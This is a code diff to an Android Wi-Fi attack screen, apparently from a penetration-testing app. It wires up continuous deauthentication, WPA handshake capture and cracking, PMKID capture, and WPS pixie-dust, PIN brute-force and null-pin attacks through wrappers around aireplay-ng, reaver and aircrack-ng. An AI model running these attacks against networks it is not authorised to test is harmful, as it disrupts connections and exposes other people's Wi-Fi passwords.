@@ -69,6 +69,7 @@ class WifiFragment : Fragment() {
     private var monitorIface: String? = null
     private var airodump: Airodump? = null
     private var poller: Thread? = null
+    private val attackRunning = AtomicBoolean(false)
 
     override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, s: Bundle?): View =
         inflater.inflate(R.layout.fragment_wifi, container, false)
@@ -338,47 +339,64 @@ class WifiFragment : Fragment() {
             status.text = "Enable monitor mode first for capture/attacks."
             return
         }
-        val items = arrayOf(
-            "Capture WPA handshake (deauth + wait)",
-            "Crack captured handshake (wordlist)",
-            "PMKID capture (clientless)",
-            "WPS pixie-dust",
-            "WPS PIN brute",
-            "WPS null-pin",
-            "Deauth (burst)",
-        )
+        // Only offer attacks the AP is actually eligible for: WPA capture/crack/PMKID need a
+        // WPA* network, the WPS attacks need WPS advertised, deauth works on anything.
+        val isWpa = ap.enc.startsWith("WPA")
+        val items = ArrayList<Pair<String, Boolean>>()   // label, needsConfirm (RF attack)
+        val run = ArrayList<() -> Unit>()
+        if (isWpa) {
+            items += "Capture WPA handshake (deauth + wait)" to true; run += { captureHandshake(mon, ap) }
+            items += "Crack captured handshake (wordlist)" to false; run += { crack(ap) }
+            items += "PMKID capture (clientless)" to true; run += { pmkid(mon, ap) }
+        }
+        if (ap.wps) {
+            items += "WPS pixie-dust" to true; run += { wps(mon, ap, pixie = true) }
+            items += "WPS PIN brute (5 min)" to true; run += { wps(mon, ap, pixie = false) }
+            items += "WPS null-pin" to true; run += { wpsNull(mon, ap) }
+        }
+        items += "Deauth (continuous)" to true; run += { deauth(mon, ap) }
         MaterialAlertDialogBuilder(requireContext())
-            .setTitle(ap.name())
-            .setItems(items) { _, which ->
-                confirmActive(ap) {
-                    when (which) {
-                        0 -> captureHandshake(mon, ap)
-                        1 -> crack(ap)
-                        2 -> pmkid(mon, ap)
-                        3 -> wps(mon, ap, pixie = true)
-                        4 -> wps(mon, ap, pixie = false)
-                        5 -> wpsNull(mon, ap)
-                        6 -> deauth(mon, ap)
-                    }
-                }
+            .setTitle("${ap.name()}  [${ap.protoLabel()}]")
+            .setItems(items.map { it.first }.toTypedArray()) { _, which ->
+                if (items[which].second) confirmActive(ap) { run[which]() } else run[which]()
             }
             .show()
     }
 
     /**
-     * Run [attack] on a background thread and stream its output inline in the AP list card —
-     * the list is replaced with a live terminal view that tails the tool's log file ([outName]
-     * in the capture dir) every ~500 ms until it finishes, then appends the verdict. Tap Scan
-     * to return to the AP list. This replaces the old truncated single-line status output.
+     * Run [attack] on a background thread and stream its output inline in the AP list card.
+     * The list is replaced with a terminal view that tails the tool's log file ([outName])
+     * plus a Stop and a Back control. Stop interrupts the attack (pkills [kill]); Back returns
+     * to the AP list. [onDone] can add follow-up controls (e.g. a Crack button after a capture).
+     * The [attack] lambda gets the log path and a `running` flag it can poll for long loops.
      */
-    private fun runWithOutput(title: String, outName: String, attack: (String) -> String) {
+    private fun runAttackInline(
+        title: String,
+        outName: String,
+        kill: List<String>,
+        onDone: ((verdict: String, row: LinearLayout) -> Unit)? = null,
+        attack: (outAbs: String, running: AtomicBoolean) -> String,
+    ) {
         if (scanning) stop()
+        attackRunning.set(true)
+        val running = AtomicBoolean(true)
         val header = TextView(requireContext()).apply {
             typeface = android.graphics.Typeface.DEFAULT_BOLD
             textSize = 14f
             setPadding(dp(8), dp(10), dp(8), dp(6))
             text = "▌ $title"
         }
+        val btnRow = LinearLayout(requireContext()).apply {
+            orientation = LinearLayout.HORIZONTAL
+            setPadding(dp(8), 0, dp(8), dp(8))
+        }
+        val stopBtn = Button(requireContext()).apply { text = "Stop" }
+        val backBtn = Button(requireContext()).apply {
+            text = "Back to list"
+            (layoutParams as? LinearLayout.LayoutParams)
+        }
+        backBtn.setPadding(dp(8), 0, 0, 0)
+        btnRow.addView(stopBtn); btnRow.addView(backBtn)
         val outView = TextView(requireContext()).apply {
             typeface = android.graphics.Typeface.MONOSPACE
             textSize = 12f
@@ -386,13 +404,27 @@ class WifiFragment : Fragment() {
             setTextIsSelectable(true)
             text = "running…"
         }
-        list.removeAllViews(); list.addView(header); list.addView(outView)
-        status.text = "$title — running… (tap Scan to return to the AP list)"
+        list.removeAllViews(); list.addView(header); list.addView(btnRow); list.addView(outView)
+        status.text = "$title — running…"
         val scroll = list.parent as? ScrollView
         val outAbs = tools.workFile(outName)
         Root.run("rm -f '$outAbs' 2>/dev/null")
-        val running = AtomicBoolean(true)
-        Thread {
+
+        fun stopAttack() {
+            running.set(false); attackRunning.set(false)
+            if (kill.isNotEmpty()) Thread {
+                // Escalate: aireplay-ng in injection mode ignores a plain SIGINT/SIGTERM for a
+                // while, so fall through to SIGKILL.
+                kill.forEach {
+                    Root.run("pkill -INT -f $it 2>/dev/null; sleep 1; " +
+                        "pkill -TERM -f $it 2>/dev/null; sleep 1; pkill -KILL -f $it 2>/dev/null")
+                }
+            }.start()
+        }
+        stopBtn.setOnClickListener { stopAttack(); stopBtn.text = "Stopping…"; stopBtn.isEnabled = false }
+        backBtn.setOnClickListener { stopAttack(); render() }
+
+        Thread {   // tail the log into the view
             while (running.get() && isAdded) {
                 val txt = tools.readFile(outAbs)
                 if (txt.isNotBlank()) outView.post {
@@ -401,14 +433,17 @@ class WifiFragment : Fragment() {
                 try { Thread.sleep(500) } catch (_: InterruptedException) { break }
             }
         }.start()
-        Thread {
-            val verdict = runCatching { attack(outAbs) }.getOrElse { "error: ${it.message}" }
-            running.set(false)
+        Thread {   // run the attack, then show verdict + follow-ups
+            val verdict = runCatching { attack(outAbs, running) }.getOrElse { "error: ${it.message}" }
+            running.set(false); attackRunning.set(false)
             if (!isAdded) return@Thread
             outView.post {
+                if (!isAdded) return@post
                 val cur = tools.readFile(outAbs)
                 outView.text = (cur + "\n\n── result ──\n" + verdict).trim()
-                status.text = "$title — done. (tap Scan to return to the AP list)"
+                status.text = "$title — done."
+                stopBtn.text = "Done"; stopBtn.isEnabled = false
+                onDone?.invoke(verdict, list)
                 scroll?.post { scroll.fullScroll(View.FOCUS_DOWN) }
             }
         }.start()
@@ -424,58 +459,74 @@ class WifiFragment : Fragment() {
             .show()
     }
 
+    /** Continuous deauth (aireplay -0 0) until the Stop button pkills aireplay-ng. */
     private fun deauth(iface: String, ap: Ap) =
-        runWithOutput("Deauth — ${ap.name()}", "deauth.log") { out ->
-            tools.deauth(iface, ap.bssid, ap.clients.keys.firstOrNull(), bursts = 10, out = out)
-            "Deauth burst sent to ${ap.bssid}."
+        runAttackInline("Deauth — ${ap.name()}", "deauth.log", kill = listOf("aireplay-ng")) { out, _ ->
+            tools.deauth(iface, ap.bssid, ap.clients.keys.firstOrNull(), bursts = 0, out = out)
+            "Deauth stopped."
         }
 
     private fun pmkid(iface: String, ap: Ap) =
-        runWithOutput("PMKID — ${ap.name()}", "pmkid.log") { out ->
+        runAttackInline("PMKID — ${ap.name()}", "pmkid.log", kill = listOf("hcxdumptool")) { out, _ ->
             tools.pmkid(iface, ap.bssid, ap.channel, out = out)
         }
 
     private fun wps(iface: String, ap: Ap, pixie: Boolean) =
-        runWithOutput(
-            (if (pixie) "WPS pixie-dust" else "WPS PIN brute") + " — ${ap.name()}", "wps.log"
-        ) { out -> tools.wps(iface, ap.bssid, ap.channel, pixie = pixie, out = out) }
+        runAttackInline(
+            (if (pixie) "WPS pixie-dust" else "WPS PIN brute") + " — ${ap.name()}",
+            "wps.log", kill = listOf("reaver")
+        ) { out, _ ->
+            tools.wps(iface, ap.bssid, ap.channel, pixie = pixie, secs = if (pixie) 180 else 300, out = out)
+        }
 
     private fun wpsNull(iface: String, ap: Ap) =
-        runWithOutput("WPS null-pin — ${ap.name()}", "wpsnull.log") { out ->
+        runAttackInline("WPS null-pin — ${ap.name()}", "wpsnull.log", kill = listOf("reaver")) { out, _ ->
             tools.wpsNull(iface, ap.bssid, ap.channel, out = out)
         }
 
     private fun crack(ap: Ap) =
-        runWithOutput("Crack handshake — ${ap.name()}", "crack.log") { out ->
+        runAttackInline("Crack handshake — ${ap.name()}", "crack.log", kill = listOf("aircrack-ng")) { out, _ ->
             val cap = tools.newest("hs-*.cap").ifBlank { tools.newest("gw-*.cap") }
             tools.crack(cap, ap.bssid, tools.wordlist, out)
         }
 
+    /** Capture a WPA handshake: airodump on the AP's channel + periodic deauth, inline, with a
+     *  "Crack this handshake" button offered once a handshake is confirmed. */
     private fun captureHandshake(iface: String, ap: Ap) {
-        status.text = "Capturing handshake for ${ap.name()} (up to 60 s)…"
-        Thread {
+        runAttackInline(
+            "Capture handshake — ${ap.name()}", "hscap.log",
+            kill = listOf("airodump-ng", "aireplay-ng"),
+            onDone = { verdict, row ->
+                if (verdict.startsWith("Handshake captured")) {
+                    val crackBtn = Button(requireContext()).apply {
+                        text = "Crack this handshake"
+                        setOnClickListener { crack(ap) }
+                    }
+                    row.addView(crackBtn)
+                }
+            }
+        ) { out, running ->
             val ch = ap.channel.takeIf { it > 0 }
             val ad = Airodump(tools, iface, ch, ap.bssid, prefix = "hs")
             ad.start()
+            tools.appendLog(out, "airodump-ng on ${ap.bssid} ch ${ap.channel}\n")
             var got: Boolean? = false
-            val deadline = System.currentTimeMillis() + 60_000
-            while (System.currentTimeMillis() < deadline && isAdded) {
-                try { Thread.sleep(5000) } catch (_: InterruptedException) { break }
+            val deadline = System.currentTimeMillis() + 120_000
+            while (running.get() && System.currentTimeMillis() < deadline && isAdded) {
+                tools.appendLog(out, "deauthing clients, waiting for handshake…\n")
                 tools.deauth(iface, ap.bssid, ap.clients.keys.firstOrNull(), bursts = 3)
                 got = tools.hasHandshake(ad.capPath(), ap.bssid)
                 if (got == true) break
+                try { Thread.sleep(4000) } catch (_: InterruptedException) { break }
             }
             val cap = ad.capPath()
             ad.stop()
-            if (isAdded) status.post {
-                status.text = when (got) {
-                    true -> "Handshake captured ✓\n$cap"
-                    false -> "No handshake in 60 s. Retry when a client is connected."
-                    null -> "Capture saved ($cap) but hcxpcapngtool isn't bundled " +
-                        "to confirm the handshake."
-                }
+            when (got) {
+                true -> "Handshake captured ✓\n$cap"
+                false -> "No handshake yet — retry with a client connected to the AP."
+                null -> "Capture saved ($cap); hcxpcapngtool missing to confirm it."
             }
-        }.start()
+        }
     }
 
     override fun onPause() {
